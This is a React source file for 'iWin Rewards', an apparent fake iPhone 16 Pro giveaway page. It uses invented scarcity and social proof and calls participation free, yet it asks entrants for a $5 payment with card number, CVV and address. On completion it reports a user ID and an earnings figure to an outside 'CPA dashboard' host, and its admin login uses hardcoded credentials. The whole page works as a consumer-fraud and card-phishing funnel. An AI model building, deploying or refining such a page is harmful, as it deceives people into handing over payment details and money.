/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, type FormEvent } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Smartphone, 
  Cpu, 
  Camera, 
  Battery, 
  ShieldCheck, 
  CheckCircle, 
  ChevronRight,
  Info,
  ArrowRight,
  Gift,
  Lock,
  Settings,
  LogOut,
  CreditCard as CreditCardIcon,
  User
} from 'lucide-react';

export default function App() {
  const [view, setView] = useState<'landing' | 'login' | 'admin'>('landing');
  const [adminLoggedIn, setAdminLoggedIn] = useState(false);
  const [requiredCardNumber, setRequiredCardNumber] = useState('1234567812345678');
  const [loginEmail, setLoginEmail] = useState('');
  const [loginPassword, setLoginPassword] = useState('');
  const [loginError, setLoginError] = useState('');

  const [selectedColor, setSelectedColor] = useState('Black Titanium');
  const [currentStep, setCurrentStep] = useState<'entry' | 'payment'>('entry');
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [enteredCardNumber, setEnteredCardNumber] = useState('');
  const [paymentError, setPaymentError] = useState('');

  const colors = [
    { name: 'Black Titanium', hex: '#3c3c3c' },
    { name: 'White Titanium', hex: '#f2f2f2' },
    { name: 'Natural Titanium', hex: '#bebbb1' },
    { name: 'Desert Titanium', hex: '#c7b5a3' }
  ];

  const features = [
    { icon: Smartphone, title: '6.3" Super Retina XDR', desc: 'Always-On display with ProMotion' },
    { icon: Cpu, title: 'A18 Pro Chip', desc: 'Built for Apple Intelligence' },
    { icon: Camera, title: 'Pro Camera System', desc: '48MP Fusion and 48MP Ultra Wide' },
    { icon: Battery, title: 'Huge Battery Life', desc: 'Up to 27 hours video playback' },
    { icon: ShieldCheck, title: 'Face ID', desc: 'Secure facial authentication' },
    { icon: CheckCircle, title: 'In Stock', desc: 'Only 3 units remaining!' }
  ];

  const [activeSlide, setActiveSlide] = useState(0);
  const slides = [
    { name: 'Desert Titanium', url: 'https://images.unsplash.com/photo-1726065408011-0e17109a84b0?q=80&w=1200&auto=format&fit=crop' },
    { name: 'Natural Titanium', url: 'https://images.unsplash.com/photo-1727210100412-2900769f90f2?q=80&w=1200&auto=format&fit=crop' },
    { name: 'White Titanium', url: 'https://images.unsplash.com/photo-1725910173268-963032906368?q=80&w=1200&auto=format&fit=crop' },
    { name: 'Black Titanium', url: 'https://images.unsplash.com/photo-1726065410111-9653096084b0?q=80&w=1200&auto=format&fit=crop' }
  ];

  const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    // Instead of redirecting immediately, we show the payment step
    setCurrentStep('payment');
    // Scroll to the form section to ensure the user sees the next step
    document.getElementById('participation-form')?.scrollIntoView({ behavior: 'smooth' });
  };

  const handlePaymentSubmit = (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const trimmedEntered = enteredCardNumber.trim();
    
    if (trimmedEntered.length < 16) {
      setPaymentError('Credit card number must be exactly 16 digits.');
      return;
    }

    const allLines = requiredCardNumber.split('\n');
    const allowedNumbers = allLines.map(n => n.trim()).filter(n => n !== '');
    
    if (allowedNumbers.includes(trimmedEntered)) {
      // Remove the used card number from the list
      const updatedLines = allLines.filter(line => line.trim() !== trimmedEntered);
      setRequiredCardNumber(updatedLines.join('\n'));
      
      setIsSubmitted(true);
      setPaymentError('');

      // Notify CPA Dashboard
      const urlParams = new URLSearchParams(window.location.search);
      const userId = urlParams.get('userId');
      
      if (userId) {
        const notifyCpaDashboard = async () => {
          try {
            await fetch('https://cpa-565218-w95z.vercel.app.run.app/api/task-completed', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer your_secure_token_here'
              },
              body: JSON.stringify({
                userId: userId,
                taskInfo: "iPhone 16 Pro 任务",
                earnings: 12.50, // 对应编号 1056 的真实价格
                transactionId: "TRX_" + Math.random().toString(36).substr(2, 9)
              })
            });
          } catch (error) {
            console.error("同步失败:", error);
          }
        };
        notifyCpaDashboard();
      }
    } else {
      setPaymentError('Invalid credit card number. Please check your card details.');
    }
  };

  const handleLogin = (e: FormEvent) => {
    e.preventDefault();
    if (loginEmail === '565218@qq.com' && loginPassword === '565218@qq.com') {
      setAdminLoggedIn(true);
      setView('admin');
      setLoginError('');
    } else {
      setLoginError('Invalid email or password.');
    }
  };

  if (view === 'login') {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="max-w-md w-full bg-white rounded-3xl shadow-xl p-8 border border-gray-200"
        >
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
              <Lock className="w-8 h-8" />
            </div>
            <h2 className="text-2xl font-bold text-gray-900">Admin Login</h2>
            <p className="text-gray-500">Enter your credentials to access the dashboard</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm font-bold text-gray-700">Email Address</label>
              <div className="relative">
                <User className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                <input 
                  required
                  type="email" 
                  value={loginEmail}
                  onChange={(e) => setLoginEmail(e.target.value)}
                  className="w-full pl-12 pr-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 outline-none"
                  placeholder="admin@example.com"
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-bold text-gray-700">Password</label>
              <div className="relative">
                <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                <input 
                  required
                  type="password" 
                  value={loginPassword}
                  onChange={(e) => setLoginPassword(e.target.value)}
                  className="w-full pl-12 pr-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 outline-none"
                  placeholder="••••••••"
                />
              </div>
            </div>

            {loginError && (
              <p className="text-red-500 text-sm font-medium text-center">{loginError}</p>
            )}

            <button 
              type="submit"
              className="w-full bg-blue-600 text-white py-4 rounded-xl font-bold hover:bg-blue-700 transition-all shadow-lg shadow-blue-100"
            >
              Sign In
            </button>
            
            <button 
              type="button"
              onClick={() => setView('landing')}
              className="w-full text-gray-500 text-sm font-medium hover:text-gray-700"
            >
              Back to Home
            </button>
          </form>
        </motion.div>
      </div>
    );
  }

  if (view === 'admin') {
    if (!adminLoggedIn) {
      setView('login');
      return null;
    }

    return (
      <div className="min-h-screen bg-gray-50 flex">
        {/* Sidebar */}
        <div className="w-64 bg-gray-900 text-white p-6 hidden md:block">
          <div className="flex items-center gap-2 mb-10">
            <Settings className="w-6 h-6 text-blue-400" />
            <span className="font-bold text-xl">Admin Panel</span>
          </div>
          <nav className="space-y-2">
            <button className="w-full flex items-center gap-3 px-4 py-3 rounded-xl bg-blue-600 text-white font-medium">
              <CreditCardIcon className="w-5 h-5" /> Dashboard
            </button>
            <button 
              onClick={() => {
                setAdminLoggedIn(false);
                setView('landing');
              }}
              className="w-full flex items-center gap-3 px-4 py-3 rounded-xl text-gray-400 hover:bg-gray-800 hover:text-white transition-all font-medium"
            >
              <LogOut className="w-5 h-5" /> Logout
            </button>
          </nav>
        </div>

        {/* Main Content */}
        <div className="flex-grow p-8">
          <div className="max-w-4xl mx-auto">
            <header className="flex justify-between items-center mb-10">
              <div>
                <h1 className="text-3xl font-bold text-gray-900">System Settings</h1>
                <p className="text-gray-500">Manage the required credit card for validation</p>
              </div>
              <button 
                onClick={() => setView('landing')}
                className="px-4 py-2 bg-white border border-gray-200 rounded-xl text-sm font-bold text-gray-600 hover:bg-gray-50 transition-all"
              >
                View Site
              </button>
            </header>

            <div className="bg-white rounded-3xl shadow-sm border border-gray-200 p-8">
              <div className="flex items-center gap-4 mb-8 p-4 bg-blue-50 rounded-2xl border border-blue-100">
                <Info className="w-6 h-6 text-blue-600" />
                <p className="text-sm text-blue-800">
                  Set the specific credit card number that users must enter to successfully complete the payment step.
                </p>
              </div>

              <div className="space-y-6">
                <div className="space-y-2">
                  <label className="text-sm font-bold text-gray-700">Allowed Credit Card Numbers (One per line)</label>
                  <textarea 
                    rows={8}
                    value={requiredCardNumber}
                    onChange={(e) => setRequiredCardNumber(e.target.value)}
                    className={`w-full px-4 py-4 rounded-xl border outline-none font-mono text-lg tracking-widest resize-none transition-all ${
                      requiredCardNumber.split('\n').filter(n => n.trim() !== '').some(n => n.trim().length !== 16)
                        ? 'border-red-300 focus:ring-2 focus:ring-red-500 bg-red-50'
                        : 'border-gray-200 focus:ring-2 focus:ring-blue-500'
                    }`}
                    placeholder="Enter card numbers, one per line..."
                  />
                  {requiredCardNumber.split('\n').filter(n => n.trim() !== '').some(n => n.trim().length !== 16) && (
                    <p className="text-red-500 text-xs font-bold mt-1">
                      Warning: Some card numbers are not exactly 16 digits!
                    </p>
                  )}
                </div>

                <div className="flex justify-end">
                  <button 
                    onClick={() => {
                      const invalid = requiredCardNumber.split('\n').filter(n => n.trim() !== '').some(n => n.trim().length !== 16);
                      if (invalid) {
                        alert('Error: All card numbers must be exactly 16 digits long.');
                      } else {
                        alert('输入成功');
                      }
                    }}
                    className="bg-blue-600 text-white px-8 py-3 rounded-xl font-bold hover:bg-blue-700 transition-all shadow-lg shadow-blue-100"
                  >
                    Save Changes
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-white/80 backdrop-blur-md border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Smartphone className="w-6 h-6 text-blue-600" />
            <span className="font-bold text-xl tracking-tight">iWin Rewards</span>
          </div>
          <div className="hidden md:flex items-center gap-8 text-sm font-medium text-gray-600">
            <a href="#features-section" className="hover:text-blue-600 transition-colors">Features</a>
            <a href="#specs-section" className="hover:text-blue-600 transition-colors">Specs</a>
            <a href="#terms-section" className="hover:text-blue-600 transition-colors">Terms</a>
            <button 
              onClick={() => setView('login')}
              className="flex items-center gap-2 hover:text-blue-600 transition-colors"
            >
              <User className="w-4 h-4" /> Login
            </button>
          </div>
          <a 
            href="#participation-form"
            className="bg-blue-600 text-white px-4 py-2 rounded-full text-sm font-semibold hover:bg-blue-700 transition-colors"
          >
            Enter Now
          </a>
        </div>
      </header>

      <main className="flex-grow">
        {/* Hero Section */}
        <section className="relative py-20 overflow-hidden bg-white">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="grid lg:grid-cols-2 gap-12 items-center">
              <motion.div 
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ duration: 0.6 }}
              >
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-blue-50 text-blue-700 text-xs font-bold uppercase tracking-wider mb-6">
                  <span className="relative flex h-2 w-2">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-2 w-2 bg-blue-500"></span>
                  </span>
                  Special Offer: 3 in stock
                </div>
                <h1 className="text-5xl md:text-6xl font-extrabold text-gray-900 leading-tight mb-6">
                  The New <span className="text-blue-600">iPhone 16 Pro</span>
                </h1>
                <p className="text-xl text-gray-600 mb-8 max-w-lg">
                  It’s a magical piece of tech. It’s so fast most devices can’t catch up. 
                  Experience the newly developed cameras that transform reality.
                </p>
                <div className="flex flex-col sm:flex-row gap-4">
                  <a 
                    href="#participation-form"
                    className="bg-gray-900 text-white px-8 py-4 rounded-xl font-bold flex items-center justify-center gap-2 hover:bg-gray-800 transition-all transform hover:scale-105"
                  >
                    Participate Now <ArrowRight className="w-5 h-5" />
                  </a>
                  <div className="flex items-center gap-3 px-4 py-2 bg-white border border-gray-200 rounded-xl">
                    <div className="flex -space-x-2">
                      {[1,2,3].map(i => (
                        <img 
                          key={i}
                          src={`https://picsum.photos/seed/user${i}/32/32`} 
                          className="w-8 h-8 rounded-full border-2 border-white"
                          referrerPolicy="no-referrer"
                          alt="User"
                        />
                      ))}
                    </div>
                    <span className="text-sm text-gray-500 font-medium">1.2k+ entered today</span>
                  </div>
                </div>
              </motion.div>

              <motion.div 
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.8, delay: 0.2 }}
                className="relative min-h-[400px] lg:min-h-[600px] flex items-center justify-center"
              >
                <div className="absolute inset-0 bg-blue-100 rounded-full blur-3xl opacity-30 transform -rotate-12 scale-110"></div>
                <img 
                  src="https://images.unsplash.com/photo-1726065408011-0e17109a84b0?q=80&w=1000&auto=format&fit=crop" 
                  alt="iPhone 16 Pro Desert Titanium" 
                  className="relative z-10 w-full h-auto max-w-md mx-auto drop-shadow-2xl"
                  referrerPolicy="no-referrer"
                  onLoad={(e) => (e.currentTarget.style.opacity = '1')}
                  style={{ opacity: 0, transition: 'opacity 0.5s' }}
                />
              </motion.div>
            </div>
          </div>
        </section>

        {/* iPhone 16 Pro Slideshow */}
        <section className="py-20 bg-gray-50 overflow-hidden">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
            <h2 className="text-3xl font-bold text-gray-900 mb-12">Explore the Titanium Finishes</h2>
            
            <div className="relative max-w-4xl mx-auto">
              <AnimatePresence mode="wait">
                <motion.div
                  key={activeSlide}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -20 }}
                  transition={{ duration: 0.4 }}
                  className="bg-white rounded-[3rem] p-8 md:p-16 shadow-2xl border border-gray-100"
                >
                  <div className="relative aspect-[4/3] md:aspect-video mb-8">
                    <img 
                      src={slides[activeSlide].url} 
                      alt={slides[activeSlide].name}
                      className="w-full h-full object-contain"
                      referrerPolicy="no-referrer"
                      onLoad={(e) => (e.currentTarget.style.opacity = '1')}
                      style={{ opacity: 0, transition: 'opacity 0.5s' }}
                    />
                  </div>
                  <div className="space-y-2">
                    <span className="text-sm font-bold text-blue-600 uppercase tracking-widest">iPhone 16 Pro</span>
                    <h3 className="text-3xl font-extrabold text-gray-900">{slides[activeSlide].name}</h3>
                  </div>
                </motion.div>
              </AnimatePresence>

              {/* Controls */}
              <div className="flex justify-center items-center gap-8 mt-12">
                <button 
                  onClick={() => setActiveSlide((prev) => (prev === 0 ? slides.length - 1 : prev - 1))}
                  className="p-4 rounded-full bg-white shadow-lg hover:bg-gray-50 transition-all active:scale-90 border border-gray-100"
                  aria-label="Previous slide"
                >
                  <ArrowRight className="w-6 h-6 transform rotate-180" />
                </button>
                <div className="flex gap-3">
                  {slides.map((_, idx) => (
                    <button
                      key={idx}
                      onClick={() => setActiveSlide(idx)}
                      className={`w-3 h-3 rounded-full transition-all ${
                        activeSlide === idx ? 'bg-blue-600 w-8' : 'bg-gray-300'
                      }`}
                      aria-label={`Go to slide ${idx + 1}`}
                    />
                  ))}
                </div>
                <button 
                  onClick={() => setActiveSlide((prev) => (prev === slides.length - 1 ? 0 : prev + 1))}
                  className="p-4 rounded-full bg-white shadow-lg hover:bg-gray-50 transition-all active:scale-90 border border-gray-100"
                  aria-label="Next slide"
                >
                  <ArrowRight className="w-6 h-6" />
                </button>
              </div>
            </div>
          </div>
        </section>

        {/* Features Grid */}
        <section className="py-20 bg-white" id="features-section">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="text-center mb-16">
              <h2 className="text-3xl font-bold text-gray-900 mb-4">Why iPhone 16 Pro?</h2>
              <p className="text-gray-600 max-w-2xl mx-auto">
                A winner will be selected from all eligible entrants. 
                The lucky winner will be directly contacted by email.
              </p>
            </div>
            <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
              {features.map((feature, idx) => (
                <motion.div 
                  key={idx}
                  initial={{ opacity: 0, y: 20 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  viewport={{ once: true }}
                  transition={{ delay: idx * 0.1 }}
                  className="p-6 rounded-2xl bg-gray-50 border border-gray-100 hover:border-blue-200 hover:shadow-lg transition-all group"
                >
                  <div className="w-12 h-12 rounded-xl bg-blue-100 flex items-center justify-center mb-4 group-hover:bg-blue-600 transition-colors">
                    <feature.icon className="w-6 h-6 text-blue-600 group-hover:text-white transition-colors" />
                  </div>
                  <h3 className="text-lg font-bold text-gray-900 mb-2">{feature.title}</h3>
                  <p className="text-gray-600 text-sm">{feature.desc}</p>
                </motion.div>
              ))}
            </div>
          </div>
        </section>

        {/* Participation Form */}
        <section className="py-20 bg-gray-50" id="participation-form">
          <div className="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="bg-white rounded-3xl shadow-xl overflow-hidden border border-gray-100">
              <div className="p-8 md:p-12">
                <div className="text-center mb-10">
                  <h2 className="text-3xl font-bold text-gray-900 mb-2">Fill Out Your Details</h2>
                  <p className="text-gray-600">Select your preferred color and enter to win.</p>
                </div>

                <AnimatePresence mode="wait">
                  {!isSubmitted ? (
                    currentStep === 'entry' ? (
                      <motion.form 
                        key="entry-form"
                        initial={{ opacity: 0, x: 20 }}
                        animate={{ opacity: 1, x: 0 }}
                        exit={{ opacity: 0, x: -20 }}
                        onSubmit={handleSubmit}
                        className="space-y-6"
                      >
                        <div>
                          <label className="block text-sm font-bold text-gray-700 mb-4">Choose Your Color</label>
                          <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
                            {colors.map((color) => (
                              <button
                                key={color.name}
                                type="button"
                                onClick={() => setSelectedColor(color.name)}
                                className={`relative p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${
                                  selectedColor === color.name 
                                    ? 'border-blue-600 bg-blue-50' 
                                    : 'border-gray-100 hover:border-gray-200'
                                }`}
                              >
                                <div 
                                  className="w-8 h-8 rounded-full shadow-inner" 
                                  style={{ backgroundColor: color.hex }}
                                ></div>
                                <span className="text-xs font-bold">{color.name}</span>
                                {selectedColor === color.name && (
                                  <div className="absolute -top-2 -right-2 bg-blue-600 text-white rounded-full p-1">
                                    <CheckCircle className="w-3 h-3" />
                                  </div>
                                )}
                              </button>
                            ))}
                          </div>
                        </div>

                        <div className="grid sm:grid-cols-2 gap-4">
                          <div className="space-y-2">
                            <label className="text-sm font-bold text-gray-700">First Name</label>
                            <input 
                              required
                              name="firstName"
                              type="text" 
                              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
                              placeholder="John"
                            />
                          </div>
                          <div className="space-y-2">
                            <label className="text-sm font-bold text-gray-700">Last Name</label>
                            <input 
                              required
                              name="lastName"
                              type="text" 
                              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
                              placeholder="Doe"
                            />
                          </div>
                        </div>

                        <div className="grid sm:grid-cols-2 gap-4">
                          <div className="space-y-2">
                            <label className="text-sm font-bold text-gray-700">Email Address</label>
                            <input 
                              required
                              name="email"
                              type="email" 
                              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
                              placeholder="john@example.com"
                            />
                          </div>
                          <div className="space-y-2">
                            <label className="text-sm font-bold text-gray-700">Phone Number</label>
                            <input 
                              required
                              name="phone"
                              type="tel" 
                              className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
                              placeholder="+1 (555) 000-0000"
                            />
                          </div>
                        </div>

                        <div className="flex items-start gap-3 p-4 bg-gray-50 rounded-xl border border-gray-100">
                          <input type="checkbox" required className="mt-1 w-4 h-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500" />
                          <p className="text-xs text-gray-500 leading-relaxed">
                            I agree to the <a href="#" className="text-blue-600 underline">Terms & Conditions</a> and <a href="#" className="text-blue-600 underline">Privacy Policy</a>. 
                            I understand that a winner will be selected from all eligible entrants.
                          </p>
                        </div>

                        <button 
                          type="submit"
                          className="w-full bg-blue-600 text-white py-4 rounded-xl font-bold text-lg hover:bg-blue-700 transition-all shadow-lg shadow-blue-200 active:scale-[0.98]"
                        >
                          Submit Entry
                        </button>
                      </motion.form>
                    ) : (
                      <motion.form 
                        key="payment-form"
                        initial={{ opacity: 0, x: 20 }}
                        animate={{ opacity: 1, x: 0 }}
                        exit={{ opacity: 0, x: -20 }}
                        onSubmit={handlePaymentSubmit}
                        className="space-y-6"
                      >
                        <div className="flex flex-col items-center text-center mb-6">
                          <div className="relative mb-4">
                            <div className="w-16 h-16 bg-red-500 rounded-lg flex items-center justify-center text-white shadow-lg">
                              <Gift className="w-10 h-10" />
                            </div>
                            <div className="absolute -top-2 -right-2 flex gap-1">
                              <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
                              <div className="w-2 h-2 bg-teal-400 rounded-full animate-pulse delay-75"></div>
                            </div>
                          </div>
                          <h3 className="text-xl font-bold text-gray-900">Instant Access</h3>
                          <p className="text-gray-600 mt-2 font-medium">Congratulations, pay $5.00 below</p>
                        </div>

                        <div className="space-y-4">
                          <div className="space-y-2">
                            <input 
                              required
                              type="text" 
                              maxLength={16}
                              value={enteredCardNumber}
                              onChange={(e) => {
                                const val = e.target.value.replace(/\D/g, '');
                                setEnteredCardNumber(val);
                              }}
                              className={`w-full px-4 py-3 rounded-lg border focus:ring-2 focus:border-transparent outline-none transition-all placeholder:text-gray-400 ${
                                paymentError ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-green-500'
                              }`}
                              placeholder="Card Number (16 digits)"
                            />
                            {paymentError && (
                              <p className="text-red-500 text-xs font-bold">{paymentError}</p>
                            )}
                          </div>

                          <div className="grid grid-cols-2 gap-4">
                            <select required className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-green-500 outline-none bg-white text-gray-600">
                              <option value="">--Month--</option>
                              {Array.from({ length: 12 }, (_, i) => (
                                <option key={i + 1} value={i + 1}>{String(i + 1).padStart(2, '0')}</option>
                              ))}
                            </select>
                            <select required className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-green-500 outline-none bg-white text-gray-600">
                              <option value="">--Year--</option>
                              {Array.from({ length: 10 }, (_, i) => (
                                <option key={i} value={2024 + i}>{2024 + i}</option>
                              ))}
                            </select>
                          </div>

                          <div className="grid grid-cols-2 gap-4 items-center">
                            <input 
                              required
                              type="text" 
                              maxLength={4}
                              className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-green-500 outline-none transition-all placeholder:text-gray-400"
                              placeholder="CVV"
                            />
                            <div className="flex justify-center">
                              <div className="w-12 h-8 bg-gray-100 border border-gray-300 rounded flex items-center justify-center">
                                <div className="w-8 h-4 bg-gray-400 rounded-sm relative">
                                  <div className="absolute right-1 top-1 w-2 h-2 bg-white rounded-full flex items-center justify-center text-[6px] font-bold text-gray-400">123</div>
                                </div>
                              </div>
                            </div>
                          </div>

                          <div className="grid grid-cols-2 gap-4">
                            <input 
                              required
                              type="text" 
                              className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-green-500 outline-none transition-all placeholder:text-gray-400"
                              placeholder="Address"
                            />
                            <input 
                              required
                              type="text" 
                              className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-green-500 outline-none transition-all placeholder:text-gray-400"
                              placeholder="Zip Code"
                            />
                          </div>
                        </div>

                        <button 
                          type="submit"
                          className="w-full bg-[#28a745] text-white py-4 rounded-lg font-bold text-xl hover:bg-[#218838] transition-all shadow-md active:scale-[0.98] uppercase tracking-wider"
                        >
                          PAY NOW
                        </button>

                        <div className="text-center space-y-4 pt-4 border-t border-gray-100">
                          <p className="text-sm text-gray-500">We accept the following creditcards:</p>
                          <div className="flex justify-center items-center gap-4">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" className="h-4 grayscale hover:grayscale-0 transition-all opacity-70" />
                            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-8 grayscale hover:grayscale-0 transition-all opacity-70" />
                          </div>
                        </div>
                      </motion.form>
                    )
                  ) : (
                    <motion.div 
                      key="success"
                      initial={{ opacity: 0, scale: 0.9 }}
                      animate={{ opacity: 1, scale: 1 }}
                      className="text-center py-12"
                    >
                      <div className="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6">
                        <CheckCircle className="w-10 h-10" />
                      </div>
                      <h3 className="text-2xl font-bold text-gray-900 mb-2">Congratulations!</h3>
                      <p className="text-gray-600 mb-8">
                        Operation successful! Thank you for your participation.
                      </p>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            </div>
          </div>
        </section>

        {/* Specs Section */}
        <section className="py-20 bg-white" id="specs-section">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="grid lg:grid-cols-2 gap-16 items-center">
              <div>
                <h2 className="text-3xl font-bold text-gray-900 mb-8">Technical Specifications</h2>
                <div className="space-y-6">
                  <div className="flex items-center justify-between py-4 border-b border-gray-100">
                    <span className="text-gray-500">Dimensions</span>
                    <span className="font-medium">149.6 x 71.5 x 8.25 mm</span>
                  </div>
                  <div className="flex items-center justify-between py-4 border-b border-gray-100">
                    <span className="text-gray-500">Display</span>
                    <span className="font-medium">6.3" Super Retina XDR</span>
                  </div>
                  <div className="flex items-center justify-between py-4 border-b border-gray-100">
                    <span className="text-gray-500">Resolution</span>
                    <span className="font-medium">2622 x 1206 pixels</span>
                  </div>
                  <div className="flex items-center justify-between py-4 border-b border-gray-100">
                    <span className="text-gray-500">Chip</span>
                    <span className="font-medium">A18 Pro (64-bit)</span>
                  </div>
                  <div className="flex items-center justify-between py-4 border-b border-gray-100">
                    <span className="text-gray-500">Weight</span>
                    <span className="font-medium">199 grams</span>
                  </div>
                </div>
              </div>
              <div className="bg-gray-900 rounded-3xl p-8 text-white relative overflow-hidden">
                <div className="absolute top-0 right-0 p-8 opacity-10">
                  <Info className="w-32 h-32" />
                </div>
                <h3 className="text-2xl font-bold mb-4">Important Information</h3>
                <p className="text-gray-400 mb-6 leading-relaxed">
                  Participation is free and open to all eligible residents. 
                  The winner will be selected randomly and notified via the provided email address. 
                  Make sure to check your spam folder!
                </p>
                <div className="flex items-center gap-2 text-blue-400 font-bold">
                  Learn more about our selection process <ChevronRight className="w-4 h-4" />
                </div>
              </div>
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="bg-gray-50 border-t border-gray-200 py-12" id="terms-section">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col md:flex-row justify-between items-center gap-8">
            <div className="flex items-center gap-2">
              <Smartphone className="w-5 h-5 text-gray-400" />
              <span className="font-bold text-gray-900">iWin Rewards</span>
            </div>
            <div className="flex gap-8 text-sm text-gray-500">
              <button 
                onClick={() => setView('login')}
                className="hover:text-gray-900 transition-colors"
              >
                Admin Login
              </button>
              <a href="#" className="hover:text-gray-900 transition-colors">Terms & Conditions</a>
              <a href="#" className="hover:text-gray-900 transition-colors">Privacy Policy</a>
              <a href="#" className="hover:text-gray-900 transition-colors">Cookie Policy</a>
            </div>
            <p className="text-xs text-gray-400">
              © 2026 iWin Rewards. All rights reserved. Apple is a trademark of Apple Inc.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
}
